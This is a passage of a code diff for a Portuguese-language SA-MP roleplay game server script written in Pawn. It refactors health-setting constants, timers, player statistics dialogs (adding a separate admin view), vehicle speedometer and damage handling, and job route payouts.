-          		SetPlayerHealthEx(playerid, 60, 2);
+          		SetPlayerHealthEx(playerid, 60, HEALTH_REMOVE);
 		    }
 		    else
 		    {
-		        SetPlayerHealthEx(playerid, 80, 2);
+		        SetPlayerHealthEx(playerid, 80, HEALTH_REMOVE);
 			}
   		}
 
@@ -9424,72 +9461,71 @@ public UpdateJogador(playerid)
 				{
 				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens Gripe. Visita o Hospital o mais rápido possível");
 				    PlayerActionMessage(playerid, 15.0, "espirra.");
-				    SetPlayerHealthEx(playerid, 15, 2);
+				    SetPlayerHealthEx(playerid, 15, HEALTH_REMOVE);
 				}
 				case 2: // Infeção Urinária
 				{
 				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens uma Infeção Urinária. Visita o Hospital o mais rápido possível");
-					SetPlayerHealthEx(playerid, 15, 2);
+					SetPlayerHealthEx(playerid, 15, HEALTH_REMOVE);
 				}
 				case 3: // Dores de barriga
 				{
 				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens Dores de Barriga intensas. Visita o Hospital o mais rápido possível");
 				    PlayerActionMessage(playerid, 15.0, "vomita.");
 				    ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P",4.1,0,1,1,2000,1);
-                    SetPlayerHealthEx(playerid, 5, 2);
+                    SetPlayerHealthEx(playerid, 5, HEALTH_REMOVE);
 				}
 				case 4: // Ataques de tosse
 				{
 				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens Ataques de Tosse regulares. Visita o Hospital o mais rápido possível");
 				    PlayerActionMessage(playerid, 15.0, "começa a tossir.");
-					SetPlayerHealthEx(playerid, 10, 2);
+					SetPlayerHealthEx(playerid, 10, HEALTH_REMOVE);
 				}
 		    }
 		}
-		
+
 		if(pInfo[playerid][Minutos] == 60)
 		{
   			pInfo[playerid][Minutos] = 0;
 		    Segundos[playerid] = 0;
-		    
+
 		    PayDay(playerid);
 		}
 	}
-	
+
 	if(pInfo[playerid][Jailed] == 1)
 	{
  		pInfo[playerid][JailTime]--;
 
 		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~w~Tempo Restante: ~g~%d segundos.", pInfo[playerid][JailTime]);
 		GameTextForPlayer(playerid, string, 999, 3);
-		
+
 	    if(pInfo[playerid][JailTime] == 0)
 	    {
 			pInfo[playerid][Jailed] = 0;
 			SpawnarJogador(playerid);
 	    }
 	}
-	
+
 	if(pInfo[playerid][Preso] == 1)
 	{
 	    pInfo[playerid][PresoTempo]--;
-	    
+
 		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~w~Tempo Restante: ~g~%d segundos.", pInfo[playerid][PresoTempo]);
 		GameTextForPlayer(playerid, string, 999, 3);
-		
+
 	    if(pInfo[playerid][PresoTempo] == 0)
 	    {
 			pInfo[playerid][Preso] = 0;
 			SpawnarJogador(playerid);
 	    }
 	}
-	
+
 	if(AdminDuty[playerid] == false)
 	{
 		foreach(new i : Player)
 		{
-			// if(!IsPlayerConnected(i)) continue;
-			if(IsAmigo(playerid, i) == 1 || AdminDuty[i] == true)
+			if(IsAmigo(playerid, i) || AdminDuty[i] == true)
 			{
 			    ShowPlayerNameTagForPlayer(playerid, i, true);
 			}
@@ -9503,13 +9539,12 @@ public UpdateJogador(playerid)
 	{
 		foreach(new i : Player)
 		{
-			// if(!IsPlayerConnected(i)) continue;
 			ShowPlayerNameTagForPlayer(playerid, i, true);
 		}
 	}
-	
+
 	Tickafter_Update[playerid] = GetTickCount();
-	
+
 	if(Tickbefore_Update[playerid] <= Tickafter_Update[playerid])
 	{
 		TickTotal_Update += Tickafter_Update[playerid]-Tickbefore_Update[playerid];
@@ -9533,13 +9568,13 @@ public DrugEffect(playerid)
 	{
 		SetPlayerDrunkLevel(playerid, 50000);
 	}
-	
+
 	new rand = random(46);
-	
+
 	SetPlayerWeather(playerid, rand);
-	
+
 	DrugEffectCounter[playerid]++;
-	
+
 	if(DrugEffectCounter[playerid] == 1000) // ~2 minutos
 	{
 	    DrugEffectCounter[playerid] = 0;
@@ -9547,7 +9582,7 @@ public DrugEffect(playerid)
 
 	    KillTimer(TimerDroga[playerid]);
 	}
-	
+
 	return 1;
 }
 
@@ -9557,7 +9592,7 @@ public VirarAmigo(playerid, giveplayerid)
 
 	format(string, sizeof(string), "PCRP/Amigos/%s.ini", GetName(playerid));
 	format(entry, sizeof(entry), "%s\r\n", GetName(giveplayerid));
-	
+
 	hFile = fopen(string, io_append);
 	fwrite(hFile, entry);
 	fclose(hFile);
@@ -9566,12 +9601,11 @@ public VirarAmigo(playerid, giveplayerid)
 public RadioMessageOOC(playerid, faction, msg[])
 {
 	new string[128];
-	
-	SetTimerEx("AcabarMsg", 1000, false, "i", playerid);
+
+	SetPlayerTimer(playerid, "AcabarMsg", 1000, false);
 
 	foreach(new i : Player)
 	{
-	    // if(!IsPlayerConnected(i)) continue;
 	    if(pInfo[i][Faction] == 0) continue;
 	    if(fInfo[pInfo[i][Faction]][Legal] == 0) continue;
 	    if(pInfo[playerid][Faction] != pInfo[i][Faction]) continue;
@@ -9588,11 +9622,10 @@ public RadioMessage(playerid, faction, msg[])
 	new string[128];
 
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
-	SetTimerEx("AcabarMsg", 1000, false, "i", playerid);
+	SetPlayerTimer(playerid, "AcabarMsg", 1000, false);
 
 	foreach(new i : Player)
 	{
-	    // if(!IsPlayerConnected(i)) continue;
 	    if(pInfo[i][Faction] == 0) continue;
 	    if(fInfo[pInfo[i][Faction]][Legal] == 0) continue;
 	    if(pInfo[playerid][Faction] != pInfo[i][Faction]) continue;
@@ -9629,18 +9662,17 @@ public RadioMessage(playerid, faction, msg[])
 public RadioMessageGlobal(playerid, faction, msg[])
 {
 	new string[128];
-	
+
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
-	SetTimerEx("AcabarMsg", 1000, false, "i", playerid);
-	
+	SetPlayerTimer(playerid, "AcabarMsg", 1000, false);
+
 	foreach(new i : Player)
 	{
-	    // if(!IsPlayerConnected(i)) continue;
 	    if(pInfo[i][Faction] == 0) continue;
 	    if(fInfo[pInfo[i][Faction]][Legal] == 0) continue;
-	    
+
 		format(string, sizeof(string), "[%s] %s %s: %s", fInfo[pInfo[playerid][Faction]][Nome], GetRankName(pInfo[playerid][Faction], pInfo[playerid][FactionRank]), GetPlayerNameEx(playerid), msg);
-		
+
 		switch(fInfo[pInfo[playerid][Faction]][Type])
 		{
 		    case F_POLICIA:
@@ -9665,7 +9697,7 @@ public RadioMessageGlobal(playerid, faction, msg[])
 		    }
 		}
 	}
-	
+
 	return 1;
 }
 
@@ -9673,7 +9705,7 @@ forward AcabarMsg(playerid);
 public AcabarMsg(playerid)
 {
 	SetPlayerSpecialAction(playerid, 0);
-	
+
 	return 1;
 }
 
@@ -9684,11 +9716,11 @@ public HangupTimer(playerid)
 		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USECELLPHONE)
 		{
 			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
-			
+
 			return 1;
 		}
 	}
-	
+
 	return 0;
 }
 
@@ -9699,7 +9731,7 @@ public WalkieTalkieMessage(playerid, msg[], freq)
 	if(!IsPlayerInAnyVehicle(playerid))
 	{
 		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
-		SetTimerEx("HangupTimer", 1000, false, "i", playerid);
+		SetPlayerTimer(playerid, "HangupTimer", 1000, false);
 	}
 
 	foreach(new i : Player)
@@ -9708,7 +9740,7 @@ public WalkieTalkieMessage(playerid, msg[], freq)
 	    if(pObjects[i][WalkieTalkieFreq] != freq) continue;
 	    if(playerid == i) continue;
 
-		if(IsAmigo(i, playerid) == 1 || pInfo[playerid][Admin] > 0)
+		if(IsAmigo(i, playerid) || pInfo[playerid][Admin] > 0)
 		{
 			format(name, sizeof(name), "%s", GetPlayerNameEx(playerid));
 		}
@@ -9716,19 +9748,50 @@ public WalkieTalkieMessage(playerid, msg[], freq)
 		{
 			format(name, sizeof(name), "Desconhecido (UID: %d)", pInfo[playerid][UID]);
 		}
-		
+
 		format(string, sizeof(string), "[WT:] %s: {04A7DE}%s.", name, msg);
 
 		SendClientMessage(i, 0x1888ADAA, string);
 	}
-	
+
 	return 1;
 }
 
-public ShowStats(playerid, target, admincheck)
+public ShowStatsAdmin(playerid, target)
 {
-	new sdialog[3000];
-	new string[700];
+	new sdialog[3500];
+	new string[256];
+
+	format(string, sizeof(string), "{75BF76}Key: {FFFFFF}%s - {75BF76}Banido: {FFFFFF}%d - {75BF76}UID: {FFFFFF}%d - {75BF76}Vida: {FFFFFF}%f - {75BF76}Level: {FFFFFF}%d", pInfo[target][Key], pInfo[target][Banido], pInfo[target][UID], pInfo[target][Vida], pInfo[target][Level]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}Skin: {FFFFFF}%d - {75BF76}Admin: {FFFFFF}%d - {75BF76}Emprego: {FFFFFF}%d - {75BF76}Faction: {FFFFFF}%d - {75BF76}FactionRank: {FFFFFF}%d - {75BF76}AJCounter: {FFFFFF}%d", pInfo[target][Skin], pInfo[target][Admin], pInfo[target][Emprego], pInfo[target][Faction], pInfo[target][FactionRank], pInfo[target][AJCounter]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}RegDay: {FFFFFF}%s - {75BF76}Origem: {FFFFFF}%d - {75BF76}Sexo: {FFFFFF}%d - {75BF76}Idade: {FFFFFF}%d - {75BF76}Registado: {FFFFFF}%d - {75BF76}TutFeito: {FFFFFF}%d", pInfo[target][RegDay], pInfo[target][Origem], pInfo[target][Sexo], pInfo[target][Idade], pInfo[target][Registado], pInfo[target][TutFeito]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}Money: {FFFFFF}%d - {75BF76}Bank: {FFFFFF}%d - {75BF76}ChaveBiz: {FFFFFF}%d - {75BF76}ChaveCasa: {FFFFFF}%d - {75BF76}ChaveCasaAlugada: {FFFFFF}%d - {75BF76}Minutos: {FFFFFF}%d", pInfo[target][Money], pInfo[target][Bank], pInfo[target][ChaveBiz], pInfo[target][ChaveCasa], pInfo[target][ChaveCasaAlugada], pInfo[target][Minutos]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}ChaveCarro1: {FFFFFF}%d - {75BF76}ChaveCarro2: {FFFFFF}%d - {75BF76}ChaveCarro3: {FFFFFF}%d - {75BF76}ChaveCarro4: {FFFFFF}%d", pInfo[target][ChaveCarro1], pInfo[target][ChaveCarro2], pInfo[target][ChaveCarro3], pInfo[target][ChaveCarro4]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}ChaveCarroEmp1: {FFFFFF}%d - {75BF76}ChaveCarroEmp2: {FFFFFF}%d - {75BF76}ChaveCarroEmp3: {FFFFFF}%d - {75BF76}ChaveCarroEmp4: {FFFFFF}%d", pInfo[target][ChaveCarroEmp1], pInfo[target][ChaveCarroEmp2], pInfo[target][ChaveCarroEmp3], pInfo[target][ChaveCarroEmp4]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}PreDrogas: {FFFFFF}%d - {75BF76}PreMateriais: {FFFFFF}%d - {75BF76}Drogas: {FFFFFF}%d - {75BF76}Materiais: {FFFFFF}%d - {75BF76}XP: {FFFFFF}%d - {75BF76}Meses: {FFFFFF}%d", pInfo[target][PreDrogas], pInfo[target][PreMateriais], pInfo[target][Drogas], pInfo[target][Materiais], pInfo[target][XP], pInfo[target][Meses]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}CartaLig: {FFFFFF}%d - {75BF76}CartaMota: {FFFFFF}%d - {75BF76}CartaPesados: {FFFFFF}%d - {75BF76}CartaBarco: {FFFFFF}%d - {75BF76}LicArmas: {FFFFFF}%d", pInfo[target][CartaLig], pInfo[target][CartaMota], pInfo[target][CartaPesados], pInfo[target][CartaBarco], pInfo[target][LicArmas]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}Multas: {FFFFFF}%d - {75BF76}Jailed: {FFFFFF}%d - {75BF76}JailedTime: {FFFFFF}%d - {75BF76}Preso: {FFFFFF}%d - {75BF76}PresoTempo: {FFFFFF}%d - {75BF76}Doenca: {FFFFFF}%d", pInfo[target][Multas], pInfo[target][Jailed], pInfo[target][JailTime], pInfo[target][Preso], pInfo[target][PresoTempo], pInfo[target][Doenca]); strcat(sdialog,string);
+ 	format(string, sizeof(string), "\n\n{75BF76}Medicamentos: {FFFFFF}%d - {75BF76}MedicamentosTomados: {FFFFFF}%d - {75BF76}ReceitaMedica: {FFFFFF}%d - {75BF76}Morto: {FFFFFF}%d", pInfo[target][Medicamentos], pInfo[target][MedicamentosTomados], pInfo[target][ReceitaMedica], pInfo[target][Morto]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}MorteX: {FFFFFF}%f - {75BF76}MorteY: {FFFFFF}%f - {75BF76}MorteZ: {FFFFFF}%f - {75BF76}MorteVirtualWorld: {FFFFFF}%d - {75BF76}MorteInterior: {FFFFFF}%d", pInfo[target][MorteX], pInfo[target][MorteY], pInfo[target][MorteZ], pInfo[target][MorteVirtualWorld], pInfo[target][MorteInterior]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}Euro1: {FFFFFF}%d - {75BF76}Euro2: {FFFFFF}%d - {75BF76}Euro3: {FFFFFF}%d - {75BF76}Euro4: {FFFFFF}%d - {75BF76}Euro5: {FFFFFF}%d - {75BF76}BilheteEuro: {FFFFFF}%d", pInfo[target][Euro1], pInfo[target][Euro2], pInfo[target][Euro3], pInfo[target][Euro4], pInfo[target][Euro5], pInfo[target][BilheteEuro]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}Estrela1: {FFFFFF}%d - {75BF76}Estrela2: {FFFFFF}%d - {75BF76}Codigo: {FFFFFF}%d - {75BF76}Rotas: {FFFFFF}%d - {75BF76}EmpregoNivel: {FFFFFF}%d - {75BF76}TempoRota: {FFFFFF}%d", pInfo[target][Estrela1], pInfo[target][Estrela2], pInfo[target][Codigo], pInfo[target][Rotas], pInfo[target][EmpregoNivel], pInfo[target][TempoRota]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}CC: {FFFFFF}%d - {75BF76}Seguradora: {FFFFFF}%d - {75BF76}MensalidadeSeguradora: {FFFFFF}%d - {75BF76}SeguradoraCount: {FFFFFF}%d - {75BF76}SeguradoraPayCount: {FFFFFF}%d", pInfo[target][CC], pInfo[target][Seguradora], pInfo[target][MensalidadeSeguradora], pInfo[target][SeguradoraCount], pInfo[target][SeguradoraPayCount]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}Viciado: {FFFFFF}%d - {75BF76}TempoViciado: {FFFFFF}%d - {75BF76}ADesentoxicar: {FFFFFF}%d - {75BF76}NumeroTelemovel: {FFFFFF}%d - {75BF76}Rede: {FFFFFF}%d - {75BF76}Saldo: {FFFFFF}%d", pInfo[target][Viciado], pInfo[target][TempoViciado], pInfo[target][ADesentoxicar], pInfo[target][NumeroTelemovel], pInfo[target][Rede], pInfo[target][Saldo]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}TutFalhado: {FFFFFF}%d - {75BF76}LicPesca: {FFFFFF}%d - {75BF76}Colete: {FFFFFF}%f - {75BF76}SpawnX: {FFFFFF}%f - {75BF76}SpawnY: {FFFFFF}%f - {75BF76}SpawnZ: {FFFFFF}%f", pInfo[target][TutFalhado], pInfo[target][LicPesca], pInfo[target][Colete], pInfo[target][SpawnX], pInfo[target][SpawnY], pInfo[target][SpawnZ]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}SpawnVirtualWorld: {FFFFFF}%d - {75BF76}SpawnInterior: {FFFFFF}%d  - {75BF76}Kicks: {FFFFFF}%d - {75BF76}VezesPreso: {FFFFFF}%d", pInfo[target][SpawnVirtualWorld], pInfo[target][SpawnInterior], pInfo[target][Kicks], pInfo[target][VezesPreso]); strcat(sdialog,string);
+    format(string, sizeof(string), "\n\n{75BF76}Golds: {FFFFFF}%d - {75BF76}Suspeito: {FFFFFF}%d - {75BF76}VezesSuspeito: {FFFFFF}%d", pInfo[target][Golds], pInfo[target][Suspeito], pInfo[target][VezesSuspeito]); strcat(sdialog,string);
+	format(string, sizeof(string), "\n\n{75BF76}NumeroTelemovel: {FFFFFF}%d - {75BF76}Rede: {FFFFFF}%d - {75BF76}Saldo: {FFFFFF}%d", pInfo[target][NumeroTelemovel], pInfo[target][Rede], pInfo[target][Saldo]); strcat(sdialog,string);
+	ShowPlayerDialog(playerid, DIALOG_ESTATISTICAS, DIALOG_STYLE_MSGBOX,"{FF8000}ESTATÍSTICAS PARA ADMIN:", sdialog, "Ok", "");
+
+
+	return 1;
+}
+
+
+public ShowStats(playerid, target)
+{
+	new sdialog[2048];
+	new string[256];
 	new telemovel[10];
 	new ligeiros[4];
 	new pesados[4];
@@ -9739,7 +9802,7 @@ public ShowStats(playerid, target, admincheck)
 	new rank[16];
 	new faction[32];
 	new factionrank[32];
-	
+
 	switch(pInfo[target][Admin])
 	{
 	    case 0:
@@ -9773,7 +9836,7 @@ public ShowStats(playerid, target, admincheck)
 			rank = "Scripter";
 	    }
 	}
-	
+
 	if(pInfo[target][Faction] == 0)
 	{
 	    faction = "Nenhuma";
@@ -9783,52 +9846,13 @@ public ShowStats(playerid, target, admincheck)
 	{
 	    factionrank = GetRankName(pInfo[target][Faction], pInfo[target][FactionRank]);
 	}
-	
-	if(pInfo[target][CartaLig] == 1)
-	{
-	    ligeiros = "Sim";
-	}
-	else
-	{
-	    ligeiros = "Não";
-	}
-	
-	if(pInfo[target][CartaPesados] == 1)
-	{
-	    pesados = "Sim";
-	}
-	else
-	{
-	    pesados = "Não";
-	}
-	
-	if(pInfo[target][CartaMota] == 1)
-	{
-	    mota = "Sim";
-	}
-	else
-	{
-	    mota = "Não";
-	}
 
-	if(pInfo[target][LicArmas] == 1)
-	{
-	    armas = "Sim";
-	}
-	else
-	{
-	    armas = "Não";
-	}
-	
-	if(pInfo[target][CartaBarco] == 1)
-	{
-	    barco = "Sim";
-	}
-	else
-	{
-	    barco = "Não";
-	}
-	
+	ligeiros = (pInfo[target][CartaLig] == 1) ? ("Sim") : ("Não");
+	pesados = (pInfo[target][CartaPesados] == 1) ? ("Sim") : ("Não");
+	mota = (pInfo[target][CartaMota] == 1) ? ("Sim") : ("Não");
+	armas = (pInfo[target][LicArmas] == 1) ? ("Sim") : ("Não");
+	barco = (pInfo[target][CartaBarco] == 1) ? ("Sim") : ("Não");
+
 	if(pObjects[target][Telemovel] == 0)
  	{
  		telemovel = "Não tem";
@@ -9837,7 +9861,7 @@ public ShowStats(playerid, target, admincheck)
 	{
 		format(telemovel, sizeof(telemovel), "%d", pInfo[playerid][NumeroTelemovel]);
 	}
-	
+
 	format(string, sizeof(string), "{487349}[GERAL:] {75BF76}Nome: {FFFFFF}%s - {75BF76}Nível: {FFFFFF}%d - {75BF76}Idade: {FFFFFF}%d - {75BF76}Meses: {FFFFFF}%d - {75BF76}Experiência: {FFFFFF}%d - {75BF76}Multas: {FFFFFF}%d", GetPlayerNameEx(target), pInfo[target][Level], pInfo[target][Idade], pInfo[target][Meses], pInfo[target][XP], pInfo[target][Multas]); strcat(sdialog,string);
     format(string, sizeof(string), "\n\n{487349}[GERAL:] {75BF76}Banco: {FFFFFF}%d$ - {75BF76}Pré-Drogas: {FFFFFF}%d - {75BF76}Pré-Materiais: {FFFFFF}%d - {75BF76}Drogas: {FFFFFF}%d - {75BF76}Materiais: {FFFFFF}%d - {75BF76}Telemóvel: {FFFFFF}%s", pInfo[target][Bank], pInfo[target][PreDrogas], pInfo[target][PreMateriais], pInfo[target][Drogas], pInfo[target][Materiais], telemovel); strcat(sdialog,string);
 	format(string, sizeof(string), "\n\n{487349}[LICENÇAS:] {75BF76}Ligeiros: {FFFFFF}%s - {75BF76}Motociclos: {FFFFFF}%s - {75BF76}Pesados: {FFFFFF}%s - {75BF76}Barco: {FFFFFF}%s - {75BF76}Armas: {FFFFFF}%s", ligeiros, mota, pesados, barco, armas); strcat(sdialog,string);
@@ -9846,18 +9870,10 @@ public ShowStats(playerid, target, admincheck)
 	format(string, sizeof(string), "\n\n{487349}[EMPRESTADOS:] {75BF76}5ª Chave: {FFFFFF}%d - {75BF76}6ª Chave: {FFFFFF}%d - {75BF76}7ª Chave: {FFFFFF}%d - {75BF76}8ª Chave: {FFFFFF}%d", pInfo[target][ChaveCarroEmp1], pInfo[target][ChaveCarroEmp2], pInfo[target][ChaveCarroEmp3], pInfo[target][ChaveCarroEmp4]); strcat(sdialog,string);
     format(string, sizeof(string), "\n\n{487349}[PESCA:] {75BF76}Isco: {FFFFFF}%d - {75BF76}Corvinas: {FFFFFF}%d - {75BF76}Congros: {FFFFFF}%d - {75BF76}Robalos: {FFFFFF}%d - {75BF76}Sargos: {FFFFFF}%d", pObjects[playerid][Isco], pObjects[playerid][Peixe_Corvina], pObjects[playerid][Peixe_Congro], pObjects[playerid][Peixe_Robalo], pObjects[playerid][Peixe_Sargo]); strcat(sdialog,string);
     format(string, sizeof(string), "\n\n{487349}[PESCA:] {75BF76}Gorazes: {FFFFFF}%d - {75BF76}Cavalas: {FFFFFF}%d - {75BF76}Douradas: {FFFFFF}%d - {75BF76}Peixes Espada: {FFFFFF}%d", pObjects[playerid][Peixe_Goraz], pObjects[playerid][Peixe_Cavala], pObjects[playerid][Peixe_Dourada], pObjects[playerid][Peixe_Espada]); strcat(sdialog,string);
-	format(string, sizeof(string), "\n\n{487349}[OOC:] {75BF76}Staff: {FFFFFF}%s - {75BF76}Rank: {FFFFFF}%s - {75BF76}Faction: {FFFFFF}%s - {75BF76}Rank: {FFFFFF}%s - {75BF76}Admin Jails: {FFFFFF}%d - {75BF76}Golds: {FFFFFF}%d", staff, rank, fInfo[pInfo[playerid][Faction]][Nome], factionrank, pInfo[target][AJCounter], pInfo[target][Golds]); strcat(sdialog,string);
-
-	if(admincheck == 1)
-	{
- 		new Float:health;
-    	GetPlayerHealth(target, health);
-    	
-        format(string, sizeof(string), "\n\n{487349}[ADMIN INFO:] {75BF76}Vezes erradas no questionário: {FFFFFF}%d {FFFFFF} - {75BF76}Minutos: {FFFFFF}%d {FFFFFF} - {75BF76}VidaVar: {FFFFFF}%f {FFFFFF} - {75BF76}Vida: {FFFFFF}%f", pInfo[target][TutFalhado], pInfo[target][Minutos], pInfo[target][Vida], health); strcat(sdialog,string);
-	}
+	format(string, sizeof(string), "\n\n{487349}[OOC:] {75BF76}Staff: {FFFFFF}%s - {75BF76}Rank: {FFFFFF}%s - {75BF76}Faction: {FFFFFF}%s - {75BF76}Rank: {FFFFFF}%s - {75BF76}Admin Jails: {FFFFFF}%d - {75BF76}Golds: {FFFFFF}%d", staff, rank, faction, factionrank, pInfo[target][AJCounter], pInfo[target][Golds]); strcat(sdialog,string);
 
 	ShowPlayerDialog(playerid, DIALOG_ESTATISTICAS, DIALOG_STYLE_MSGBOX,"{FF8000}ESTATÍSTICAS:", sdialog, "Ok", "");
-		
+
 	return 1;
 }
 
@@ -9870,12 +9886,12 @@ public Velocimetro(playerid)
 	new car = GetPlayerVehicleID(playerid);
 	new gasolina[8];
  	new Float:health;
- 	
+
     GetVehicleHealth(car, health);
     cInfo[car][Vida] = health;
-	
+
 	format(vel, sizeof(vel), "%d", velocidadeinicial);
-	
+
 	if(Motor[car] == true)
 	{
 		if(velocidadeinicial == 0) { format(consumostr, sizeof(consumostr), "0.5"); CounterVelocimetro[playerid] += 1; }
@@ -9884,15 +9900,15 @@ public Velocimetro(playerid)
 		else if(velocidadeinicial >= 99 && velocidadeinicial < 129) { format(consumostr, sizeof(consumostr), "2"); CounterVelocimetro[playerid] += 3; CounterKilometros[playerid] += 3; }
 		else if(velocidadeinicial >= 129 && velocidadeinicial < 199) { format(consumostr, sizeof(consumostr), "2.5"); CounterVelocimetro[playerid] += 4; CounterKilometros[playerid] += 4; }
 		else if(velocidadeinicial >= 199) { format(consumostr, sizeof(consumostr), "3"); CounterVelocimetro[playerid] += 6; CounterKilometros[playerid] += 5;}
-		
+
 		if(velocidadeinicial > 0)
 		{
-			new pneus = random(250000);
+			new pneus = random(100000);
 
 			if(pneus == 1) // furou os pneus
 			{
 				new rand = random(10);
-				
+
 				switch(rand)
 				{
 					case 0: { cInfo[car][Tires] = 0001; }
@@ -9907,13 +9923,13 @@ public Velocimetro(playerid)
 					case 9: { cInfo[car][Tires] = 1101; }
 					default: { cInfo[car][Tires] = 1111; }
 				}
-				
+
 				PlayerActionMessage(playerid, 15.0, "ouve um estrondo e sente o carro a fugir.");
-				
+
 				UpdateVehicleDamageStatus(cInfo[car][ID], cInfo[car][Panels], cInfo[car][Doors], cInfo[car][Lights], cInfo[car][Tires]);
 			}
 		}
-		
+
 		if(CounterKilometros[playerid] >= 150)
 		{
 	 		cInfo[car][Kilometros]++;
@@ -9960,7 +9976,7 @@ public Velocimetro(playerid)
 
 				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
 				SetVehicleParamsEx(car, 0,lights,alarm,doors,bonnet,boot,objective);
-				
+
 				Motor[car] = false;
 				PlayerActionMessage(playerid, 15.0, "deixa o carro ir abaixo.");
 			}
@@ -9970,7 +9986,7 @@ public Velocimetro(playerid)
 	{
 	    format(consumostr, sizeof(consumostr), "0");
 	}
-	
+
 	PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][0], vel);
 
 	format(gasolina, sizeof(gasolina), "%d", cInfo[car][Gasolina]);
@@ -10028,7 +10044,7 @@ public AtualizarTunning(vehicleid)
     {
         AddVehicleComponent(vehicleid, cInfo[vehicleid][mod11]);
     }
-    
+
     return 1;
 }
 
@@ -10079,9 +10095,9 @@ public AcabarRota(playerid)
 	        }
 	    }
 	}
-	
+
 	new car = GetPlayerVehicleID(playerid);
-	
+
 	switch(pInfo[playerid][Emprego])
 	{
 	    case 7,8:
@@ -10090,15 +10106,15 @@ public AcabarRota(playerid)
 			{
 			    SendClientMessage(playerid, COLOR_CHAT, "[CENTRO DE EMPREGO:] {FFFFFF}Não trouxeste o reboque porquê? Não recebeste salário por causa disso!");
 			    pInfo[playerid][TempoRota] = 6*pInfo[playerid][EmpregoNivel];
-			    
+
                 RepairVehicle(car);
                 cInfo[car][Vida] = 1000;
 				SetVehicleToRespawn(car);
 				AtualizarDanosCarro(car);
 				cInfo[car][Gasolina] = 100;
-				
+
 				sStats[0][Rotas]++;
-				
+
 				return 1;
 			}
 			else
@@ -10108,25 +10124,25 @@ public AcabarRota(playerid)
 			}
 	    }
 	}
-	
+
 	new salario, string[128];
-	
+
 	RepairVehicle(car);
 	cInfo[car][Vida] = 1000;
 	SetVehicleToRespawn(car);
 	AtualizarDanosCarro(car);
 	cInfo[car][Gasolina] = 100;
-	
+
 	pInfo[playerid][TempoRota] = 6*pInfo[playerid][EmpregoNivel];
 	salario = pInfo[playerid][EmpregoNivel]*jInfo[pInfo[playerid][Emprego]][RotaSalario];
-	
+
 	format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Acabaste a tua rota. Recebeste %d$.", salario);
 	SendClientMessage(playerid, COLOR_CHAT, string);
-	
+
 	GivePlayerMoneyEx(playerid, salario);
-	
+
 	sStats[0][Rotas]++;
-	
+
 	return 1;
 }
 
@@ -10141,7 +10157,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		cInfo[vehicleid][Doors] = doors;
 		cInfo[vehicleid][Lights] = lights;
 		cInfo[vehicleid][Tires] = tires;
-		
+
 		UpdateVehicleDamageStatus(vehicleid, cInfo[vehicleid][Panels], cInfo[vehicleid][Doors], cInfo[vehicleid][Lights], cInfo[vehicleid][Tires]);
     }
     else
@@ -10161,23 +10177,27 @@ public RestoreActor(actorid, worldid, Float:x, Float:y, Float:z)
 public AtualizarDanosCarro(vehicleid)
 {
     UpdateVehicleDamageStatus(cInfo[vehicleid][ID], cInfo[vehicleid][Panels], cInfo[vehicleid][Doors], cInfo[vehicleid][Lights], cInfo[vehicleid][Tires]);
-    
+
 	return 1;
 }
 
 public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
 {
+	if(AdminDuty[playerid] == true) return 0;
+
+	SetPlayerHealthEx(playerid, pInfo[playerid][Vida] - amount, HEALTH_SET);
+
     if(issuerid != INVALID_PLAYER_ID && AdminDuty[issuerid] == false)
     {
         if(weaponid == 0 || weaponid == 1 || weaponid == 2 || weaponid == 3 || weaponid == 4 || weaponid == 5 || weaponid == 6 || weaponid == 7 || weaponid == 8) return 1;
-        
+
         switch(bodypart)
         {
             case BODY_PART_TORSO, BODY_PART_CHEST:
             {
                 if(pInfo[playerid][Colete] > 0)
                 {
-                    SetPlayerArmourEx(playerid, amount, 2);
+                    SetPlayerArmourEx(playerid, amount, HEALTH_REMOVE);
 				}
 				else
 				{
@@ -10185,7 +10205,7 @@ public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
 
 	                if(rand == 1) // acertou no coração
 	                {
-	                	SetPlayerHealthEx(playerid, 0, 0);
+	                	SetPlayerHealthEx(playerid, 0, HEALTH_SET);
 
 	                	SendClientMessage(playerid, COLOR_INFO, "Levaste um tiro no coração e estás agora gravemente ferido");
 					}
@@ -10194,27 +10214,27 @@ public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
             case BODY_PART_LEFT_ARM, BODY_PART_RIGHT_ARM:
             {
                 new arma = GetPlayerWeapon(playerid);
-                
+
                 if(arma != 0)
                 {
